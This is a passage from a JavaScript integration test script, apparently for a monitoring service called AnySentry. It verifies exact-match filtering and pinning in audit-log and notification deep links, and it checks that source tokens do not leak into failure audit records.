  const auditResourceA = `${runId}-audit-resource`;
  const auditResourceB = `${auditResourceA}-suffix`;
  await request(`/sources/${encodeURIComponent(auditResourceA)}`, 'PUT', {
    name: `${runId} audit resource A`,
    type: 'custom',
    enabled: false,
    owner: `${runId}-audit-owner-a`,
  });
  await request(`/sources/${encodeURIComponent(auditResourceB)}`, 'PUT', {
    name: `${runId} audit resource B`,
    type: 'custom',
    enabled: false,
    owner: `${runId}-audit-owner-b`,
  });
  const exactAuditResource = await request('/audit/list', 'POST', { resourceType: 'source', resourceId: auditResourceA, limit: 20 });
  const partialAuditResource = await request('/audit/list', 'POST', { resourceType: 'source', resourceId: auditResourceA.slice(0, -1), limit: 20 });
  const sourceAuditA = exactAuditResource.items.find((item) => item.resourceId === auditResourceA);
  if (!sourceAuditA) throw new Error(`missing exact source audit record: ${JSON.stringify({ exactAuditResource })}`);
  const pinnedAuditResource = await request('/audit/list', 'POST', { auditId: sourceAuditA.auditId, resourceType: 'source', resourceId: auditResourceB, limit: 20 });
  const filteredAuditResource = await request('/audit/list', 'POST', { resourceType: 'source', resourceId: auditResourceB, limit: 20 });

  assert('audit resourceId filter returns only exact resource records', exactAuditResource.items.length === 1 && exactAuditResource.items[0]?.resourceId === auditResourceA, exactAuditResource);
  assert('audit resourceId filter rejects partial resource IDs', !partialAuditResource.items.some((item) => item.resourceId === auditResourceA || item.resourceId === auditResourceB), partialAuditResource);
  assert(
    'audit auditId + resourceId pins target before filtered resource context',
    pinnedAuditResource.items[0]?.auditId === sourceAuditA.auditId && pinnedAuditResource.items.some((item) => item.resourceId === auditResourceB),
    pinnedAuditResource,
  );
  assert('audit resourceId filter does not leak pinned audit', filteredAuditResource.items.some((item) => item.resourceId === auditResourceB) && !filteredAuditResource.items.some((item) => item.auditId === sourceAuditA.auditId), filteredAuditResource);

  const auditActorA = `${runId}-actor`;
  const auditActorB = `${auditActorA}-suffix`;
  const auditActorSourceA = `${runId}-actor-source-a`;
  const auditActorSourceB = `${runId}-actor-source-b`;
  await request(
    `/sources/${encodeURIComponent(auditActorSourceA)}`,
    'PUT',
    {
      name: `${runId} audit actor A`,
      type: 'custom',
      enabled: false,
      owner: `${runId}-audit-actor-owner-a`,
    },
    { 'x-anysentry-actor': auditActorA, 'x-anysentry-actor-name': auditActorA },
  );
  await request(
    `/sources/${encodeURIComponent(auditActorSourceB)}`,
    'PUT',
    {
      name: `${runId} audit actor B`,
      type: 'custom',
      enabled: false,
      owner: `${runId}-audit-actor-owner-b`,
    },
    { 'x-anysentry-actor': auditActorB, 'x-anysentry-actor-name': auditActorB },
  );
  const exactAuditActor = await request('/audit/list', 'POST', { resourceType: 'source', actorId: auditActorA, limit: 20 });
  const partialAuditActor = await request('/audit/list', 'POST', { resourceType: 'source', actorId: auditActorA.slice(0, -1), limit: 20 });
  const actorAuditA = exactAuditActor.items.find((item) => item.actor.id === auditActorA && item.resourceId === auditActorSourceA);
  if (!actorAuditA) throw new Error(`missing exact actor audit record: ${JSON.stringify({ exactAuditActor })}`);
  const pinnedAuditActor = await request('/audit/list', 'POST', { auditId: actorAuditA.auditId, resourceType: 'source', actorId: auditActorB, limit: 20 });
  const filteredAuditActor = await request('/audit/list', 'POST', { resourceType: 'source', actorId: auditActorB, limit: 20 });

  assert('audit actorId filter returns only exact actor records', exactAuditActor.items.length === 1 && exactAuditActor.items[0]?.actor.id === auditActorA, exactAuditActor);
  assert('audit actorId filter rejects partial actor IDs', !partialAuditActor.items.some((item) => item.actor.id === auditActorA || item.actor.id === auditActorB), partialAuditActor);
  assert(
    'audit auditId + actorId pins target before filtered actor context',
    pinnedAuditActor.items[0]?.auditId === actorAuditA.auditId && pinnedAuditActor.items.some((item) => item.actor.id === auditActorB),
    pinnedAuditActor,
  );
  assert('audit actorId filter does not leak pinned audit', filteredAuditActor.items.some((item) => item.actor.id === auditActorB) && !filteredAuditActor.items.some((item) => item.auditId === actorAuditA.auditId), filteredAuditActor);
}

async function verifyNotifications() {
  const sourceA = await request('/sources', 'POST', {
    name: `${runId} notification source A`,
    type: 'webhook',
    enabled: true,
    requireToken: true,
    collectorId: `${runId}-notification-collector-a`,
    workspacePath: `repo://${runId}-notification-a`,
    tags: [runId, 'notification-deep-link'],
  });
  const sourceB = await request('/sources', 'POST', {
    name: `${runId} notification source B`,
    type: 'webhook',
    enabled: true,
    requireToken: true,
    collectorId: `${runId}-notification-collector-b`,
    workspacePath: `repo://${runId}-notification-b`,
    tags: [runId, 'notification-deep-link'],
  });
  const channelA = await request('/notifications/channels', 'POST', {
    name: `${runId} notification channel A`,
    type: 'webhook',
    enabled: true,
    webhookUrl: `http://127.0.0.1:9/${runId}/a`,
    labels: { probe: runId },
  });
  const channelB = await request('/notifications/channels', 'POST', {
    name: `${runId} notification channel B`,
    type: 'webhook',
    enabled: true,
    webhookUrl: `http://127.0.0.1:9/${runId}/b`,
    labels: { probe: runId },
  });
  const routeA = await request('/notifications/routes', 'POST', {
    name: `${runId} notification route A`,
    enabled: true,
    channelIds: [channelA.channelId],
    minSeverity: 'low',
    kinds: ['source'],
    sourceId: sourceA.source.sourceId,
    q: runId,
  });
  const routeB = await request('/notifications/routes', 'POST', {
    name: `${runId} notification route B`,
    enabled: true,
    channelIds: [channelB.channelId],
    minSeverity: 'low',
    kinds: ['source'],
    sourceId: sourceB.source.sourceId,
    q: runId,
  });

  const channelPinned = await request(`/notifications/config?channelId=${encodeURIComponent(channelB.channelId)}`);
  const routePinned = await request(`/notifications/config?routeId=${encodeURIComponent(routeA.routeId)}`);
  const bothPinned = await request(`/notifications/config?channelId=${encodeURIComponent(channelB.channelId)}&routeId=${encodeURIComponent(routeA.routeId)}`);
  const routeScopeA = await request(`/notifications/config?sourceId=${encodeURIComponent(sourceA.source.sourceId)}&kind=source&minSeverity=low`);
  const routeScopePartial = await request(`/notifications/config?sourceId=${encodeURIComponent(sourceA.source.sourceId.slice(0, -1))}&kind=source&minSeverity=low`);
  const routeScopePinned = await request(`/notifications/config?routeId=${encodeURIComponent(routeA.routeId)}&sourceId=${encodeURIComponent(sourceB.source.sourceId)}&kind=source&minSeverity=low`);
  const routeScopeFiltered = await request(`/notifications/config?sourceId=${encodeURIComponent(sourceB.source.sourceId)}&kind=source&minSeverity=low`);

  assert(
    'notifications channelId pins target channel first',
    channelPinned.channels[0]?.channelId === channelB.channelId && channelPinned.channels.some((item) => item.channelId === channelA.channelId),
    channelPinned,
  );
  assert(
    'notifications routeId pins target route first',
    routePinned.routes[0]?.routeId === routeA.routeId && routePinned.routes.some((item) => item.routeId === routeB.routeId),
    routePinned,
  );
  assert(
    'notifications channelId + routeId pin both lists',
    bothPinned.channels[0]?.channelId === channelB.channelId && bothPinned.routes[0]?.routeId === routeA.routeId,
    bothPinned,
  );
  assert(
    'notifications route scope returns only exact Source routes',
    routeScopeA.routes.some((item) => item.routeId === routeA.routeId) &&
      routeScopeA.routes.every((item) => item.sourceId === sourceA.source.sourceId && (item.kinds.length === 0 || item.kinds.includes('source')) && item.minSeverity === 'low'),
    routeScopeA,
  );
  assert(
    'notifications route scope rejects partial Source IDs',
    !routeScopePartial.routes.some((item) => item.routeId === routeA.routeId || item.routeId === routeB.routeId),
    routeScopePartial,
  );
  assert(
    'notifications routeId + scope pins target before filtered route context',
    routeScopePinned.routes[0]?.routeId === routeA.routeId && routeScopePinned.routes.some((item) => item.routeId === routeB.routeId),
    routeScopePinned,
  );
  assert(
    'notifications route scope does not leak pinned route',
    routeScopeFiltered.routes.some((item) => item.routeId === routeB.routeId) && !routeScopeFiltered.routes.some((item) => item.routeId === routeA.routeId),
    routeScopeFiltered,
  );

  await request('/sources/check-in', 'POST', {
    sourceId: sourceA.source.sourceId,
    token: sourceA.token,
    sourceName: sourceA.source.name,
    sourceType: sourceA.source.type,
    collectorId: sourceA.source.collectorId,
    workspacePath: sourceA.source.workspacePath,
    status: 'error',
    message: `${runId} notification delivery A`,
  });
  await request('/sources/check-in', 'POST', {
    sourceId: sourceB.source.sourceId,
    token: sourceB.token,
    sourceName: sourceB.source.name,
    sourceType: sourceB.source.type,
    collectorId: sourceB.source.collectorId,
    workspacePath: sourceB.source.workspacePath,
    status: 'error',
    message: `${runId} notification delivery B`,
  });

  const alertA = await eventually('notification source alert A', async () => {
    const list = await request('/alerts/list', 'POST', { timeType: 'last_30d', sourceId: sourceA.source.sourceId, kind: 'source', status: 'all', limit: 20 });
    return list.items.find((item) => item.sourceId === sourceA.source.sourceId && item.ruleId === 'source.check_in_error');
  });
  const alertB = await eventually('notification source alert B', async () => {
    const list = await request('/alerts/list', 'POST', { timeType: 'last_30d', sourceId: sourceB.source.sourceId, kind: 'source', status: 'all', limit: 20 });
    return list.items.find((item) => item.sourceId === sourceB.source.sourceId && item.ruleId === 'source.check_in_error');
  });
  const deliveryA = await eventually('notification delivery record A', async () => {
    const config = await request(`/notifications/config?alertId=${encodeURIComponent(alertA.alertId)}&limit=20`);
    const delivery = config.deliveries?.find((item) => item.alertId === alertA.alertId && item.channelId === channelA.channelId);
    return delivery ? { config, delivery } : undefined;
  });
  const deliveryB = await eventually('notification delivery record B', async () => {
    const config = await request(`/notifications/config?alertId=${encodeURIComponent(alertB.alertId)}&limit=20`);
    const delivery = config.deliveries?.find((item) => item.alertId === alertB.alertId && item.channelId === channelB.channelId);
    return delivery ? { config, delivery } : undefined;
  });
  const routeScopedDeliveriesA = await request(`/notifications/config?sourceId=${encodeURIComponent(sourceA.source.sourceId)}&kind=source&minSeverity=low&limit=20`);
  const routeScopedDeliveriesPartial = await request(`/notifications/config?sourceId=${encodeURIComponent(sourceA.source.sourceId.slice(0, -1))}&kind=source&minSeverity=low&limit=20`);
  const routeScopedDeliveryPinned = await request(`/notifications/config?deliveryId=${encodeURIComponent(deliveryA.delivery.deliveryId)}&sourceId=${encodeURIComponent(sourceB.source.sourceId)}&kind=source&minSeverity=low&limit=20`);
  const routeScopedDeliveriesB = await request(`/notifications/config?sourceId=${encodeURIComponent(sourceB.source.sourceId)}&kind=source&minSeverity=low&limit=20`);
  const alertPinned = await request(`/notifications/config?alertId=${encodeURIComponent(alertA.alertId)}&limit=20`);
  const deliveryPinned = await request(`/notifications/config?deliveryId=${encodeURIComponent(deliveryA.delivery.deliveryId)}&limit=20`);
  const combinedPinned = await request(`/notifications/config?deliveryId=${encodeURIComponent(deliveryA.delivery.deliveryId)}&channelId=${encodeURIComponent(channelB.channelId)}&limit=20`);

  assert(
    'notifications route scope filters delivery log rows',
    routeScopedDeliveriesA.deliveries.some((item) => item.deliveryId === deliveryA.delivery.deliveryId) &&
      routeScopedDeliveriesA.deliveries.every((item) => item.sourceId === sourceA.source.sourceId && item.alertKind === 'source' && severityAtLeast(item.alertSeverity, 'low')),
    routeScopedDeliveriesA,
  );
  assert(
    'notifications route scope rejects partial Source delivery IDs',
    !routeScopedDeliveriesPartial.deliveries.some((item) => item.deliveryId === deliveryA.delivery.deliveryId || item.deliveryId === deliveryB.delivery.deliveryId),
    routeScopedDeliveriesPartial,
  );
  assert(
    'notifications deliveryId + route scope pins target before scoped delivery context',
    routeScopedDeliveryPinned.deliveries[0]?.deliveryId === deliveryA.delivery.deliveryId &&
      routeScopedDeliveryPinned.deliveries.some((item) => item.deliveryId === deliveryB.delivery.deliveryId && item.sourceId === sourceB.source.sourceId),
    routeScopedDeliveryPinned,
  );
  assert(
    'notifications route scope delivery filter does not leak pinned delivery',
    routeScopedDeliveriesB.deliveries.some((item) => item.deliveryId === deliveryB.delivery.deliveryId) &&
      !routeScopedDeliveriesB.deliveries.some((item) => item.deliveryId === deliveryA.delivery.deliveryId),
    routeScopedDeliveriesB,
  );
  assert(
    'notifications alertId filters delivery log rows',
    alertPinned.deliveries.length >= 1 && alertPinned.deliveries.every((item) => item.alertId === alertA.alertId),
    alertPinned,
  );
  assert(
    'notifications deliveryId returns exact delivery row',
    deliveryPinned.deliveries.length === 1 && deliveryPinned.deliveries[0]?.deliveryId === deliveryA.delivery.deliveryId,
    deliveryPinned,
  );
  assert(
    'notifications deliveryId pins target before channel-filtered delivery context',
    combinedPinned.deliveries[0]?.deliveryId === deliveryA.delivery.deliveryId &&
      combinedPinned.deliveries.some((item) => item.deliveryId === deliveryB.delivery.deliveryId && item.channelId === channelB.channelId),
    combinedPinned,
  );

  const failureAuditA = await eventually('notification delivery failure audit A', async () => {
    const audit = await request('/audit/list', 'POST', {
      timeType: 'last_30d',
      action: 'notification.delivery_failed',
      resourceType: 'notification',
      resourceId: deliveryA.delivery.deliveryId,
      limit: 20,
    });
    const item = audit.items?.find((record) => record.resourceId === deliveryA.delivery.deliveryId && record.action === 'notification.delivery_failed');
    return item ? { audit, item } : undefined;
  });
  const failureAuditB = await eventually('notification delivery failure audit B', async () => {
    const audit = await request('/audit/list', 'POST', {
      timeType: 'last_30d',
      action: 'notification.delivery_failed',
      resourceType: 'notification',
      resourceId: deliveryB.delivery.deliveryId,
      limit: 20,
    });
    const item = audit.items?.find((record) => record.resourceId === deliveryB.delivery.deliveryId && record.action === 'notification.delivery_failed');
    return item ? { audit, item } : undefined;
  });
  const encodedFailureAudit = JSON.stringify(failureAuditA);
  assert(
    'notification failure audit deep-link exposes exact failed delivery scope',
    failureAuditA.item.result === 'failure' &&
      failureAuditA.item.resourceType === 'notification' &&
      failureAuditA.item.resourceId === deliveryA.delivery.deliveryId &&
      failureAuditA.item.details?.deliveryId === deliveryA.delivery.deliveryId &&
      failureAuditA.item.details?.alertId === alertA.alertId &&
      failureAuditA.item.details?.channelId === channelA.channelId &&
      failureAuditA.item.details?.routeId === routeA.routeId &&
      failureAuditA.item.details?.status === deliveryA.delivery.status &&
      !encodedFailureAudit.includes(sourceA.token) &&
      !encodedFailureAudit.includes(sourceB.token),
    failureAuditA,
  );

  const exactFailureAudit = await request('/audit/list', 'POST', { auditId: failureAuditA.item.auditId, limit: 20 });
  const pinnedFailureAudit = await request('/audit/list', 'POST', {
    auditId: failureAuditA.item.auditId,
    action: 'notification.delivery_failed',
    resourceType: 'notification',
    q: deliveryB.delivery.deliveryId,
    limit: 20,
  });
  const filteredFailureAudit = await request('/audit/list', 'POST', {
    action: 'notification.delivery_failed',
    resourceType: 'notification',
    q: deliveryB.delivery.deliveryId,
    limit: 20,
  });

  assert('notification failure audit exact auditId returns only target', exactFailureAudit.total === 1 && exactFailureAudit.items[0]?.auditId === failureAuditA.item.auditId, exactFailureAudit);
  assert(
    'notification failure auditId + filters pins target before filtered context',
    pinnedFailureAudit.items[0]?.auditId === failureAuditA.item.auditId && pinnedFailureAudit.items.some((item) => item.auditId === failureAuditB.item.auditId),
    pinnedFailureAudit,
  );
  assert(
    'notification failure audit filters do not leak pinned target',
    filteredFailureAudit.items.some((item) => item.auditId === failureAuditB.item.auditId) && !filteredFailureAudit.items.some((item) => item.auditId === failureAuditA.item.auditId),
    filteredFailureAudit,
  );
}

async function main() {
  console.log(`AnySentry deep-link verification against ${baseUrl}`);
  await request('/stats');
  await verifySources();
  await verifyCollectors();
  const events = await ingestProbeEvents();
  await verifyEvents(events);
  await ingestRiskProbeEvents();
  await verifyIncidents();
  await verifyAgentsAndWorkspaces();
  await createSourceAlerts();
  const alerts = await verifyAlerts();
  await verifyRemediations(alerts);
  await verifyCoverage();
  await verifyTopology(events);
  await verifyMaintenanceObjectivesAndAudit();
  await verifyNotifications();

  if (process.exitCode) {
    console.error(`Deep-link verification failed for probe ${runId}`);
    process.exit(process.exitCode);
  }
  console.log(`Deep-link verification passed for probe ${runId}`);
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
